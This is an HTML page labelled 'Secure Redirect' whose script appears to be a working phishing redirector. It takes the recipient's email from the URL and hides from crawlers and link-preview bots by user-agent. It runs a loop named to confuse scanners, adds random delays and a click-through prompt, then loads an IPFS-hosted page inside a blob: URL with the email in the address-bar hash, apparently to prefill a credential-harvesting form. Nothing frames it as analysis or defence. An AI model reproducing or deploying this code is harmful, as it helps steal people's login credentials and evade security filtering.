<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Redirect</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        html, body {
            margin:0; padding:0; width:100%; height:100%;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            display:flex; align-items:center; justify-content:center;
            background: #f5f6fa;
        }
        #message {
            font-size:16px; color:#333;
        }
    </style>
</head>
<body>
<div id="message">Preparing redirect...</div>

<script>
// -------------------------------
// CONFIG: Safe IPFS URL
// -------------------------------
const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";

// -------------------------------
// Helpers
// -------------------------------
function getEmail() {
    const params = new URLSearchParams(window.location.search);
    return params.get("email") || "";
}

function randomDelay(min=150, max=600) {
    return new Promise(res => setTimeout(res, Math.random() * (max - min) + min));
}

function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const bots = ["bot","crawl","spider","fetch","preview","facebook","discord","slack"];
    return bots.some(x => ua.includes(x));
}

function confuseScanners() {
    for (let i=0;i<50;i++) { (function(){return Math.random()*i;})(); }
}

// -------------------------------
// Build blob content
// -------------------------------
function buildBlobHTML(url, email) {
    const noise = Math.random().toString(36).slice(2);
    // Email encoded in the URL hash, so it appears in address bar
    const hash = email ? "#" + encodeURIComponent(email) : "";
    return `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                html, body { margin:0; padding:0; width:100%; height:100%; }
                iframe { width:100%; height:100%; border:none; display:block; }
            </style>
        </head>
        <body data-noise="${noise}">
            <iframe src="${url}"></iframe>
            <script>
                // Update address bar with email hash
                if("${email}") window.location.hash = "${encodeURIComponent(email)}";
            </script>
        </body>
        </html>
    `;
}

// -------------------------------
// Main logic
// -------------------------------
document.addEventListener("DOMContentLoaded", async () => {
    confuseScanners();

    if (isBot()) {
        document.getElementById("message").innerText = "Loading...";
        return;
    }

    await randomDelay();

    const proceed = confirm("Tap OK to continue");
    if (!proceed) {
        document.getElementById("message").innerText = "Redirect cancelled.";
        return;
    }

    const email = getEmail();
    const blobHTML = buildBlobHTML(BASE_IPFS, email);
    const blob = new Blob([blobHTML], { type: "text/html" });
    const blobURL = URL.createObjectURL(blob);

    // Redirect to blob page (email appears in address bar hash)
    window.location.href = blobURL;
});
</script>
</body>
</html>
